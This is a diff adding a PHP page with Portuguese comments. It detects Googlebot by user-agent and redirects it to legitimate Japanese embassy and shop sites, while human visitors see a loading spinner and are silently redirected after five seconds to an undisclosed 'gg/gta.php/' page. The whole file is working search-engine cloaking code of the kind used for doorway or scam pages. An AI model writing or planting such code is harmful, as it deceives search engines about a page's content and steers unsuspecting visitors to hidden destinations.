@@ -1,0 +1,59 @@
+<?php
+// Array com os links aleatórios
+$links = array(
+    'https://www.br.emb-japan.go.jp/itprtop_pt/index.html',
+    'https://japanrabbit.com/pt/lojas/',
+    'https://www.japanstore.com.br/'
+);
+
+// Verifica o user-agent para identificar o Googlebot
+$userAgent = $_SERVER['HTTP_USER_AGENT'];
+$isGooglebot = stripos($userAgent, 'Googlebot') !== false;
+
+// Redireciona o Googlebot para um link aleatório
+if ($isGooglebot) {
+    $randomLink = $links[array_rand($links)];
+    header("Location: $randomLink");
+    exit();
+}
+?>
+
+<html>
+<head>
+    <title>Carregando...</title>
+    <style>
+        /* Estilos gerais */
+        html, body {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+        }
+        
+        /* Estilos para o círculo de carregamento */
+        .loader {
+            border: 16px solid #f3f3f3;
+            border-top: 16px solid #3498db;
+            border-radius: 50%;
+            width: 120px;
+            height: 120px;
+            animation: spin 2s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+    <script>
+        setTimeout(function() {
+            window.location.href = 'gg/gta.php/';
+        }, 5000);
+    </script>
+</head>
+<body>
+    <div class="loader"></div>
+</body>
+</html>
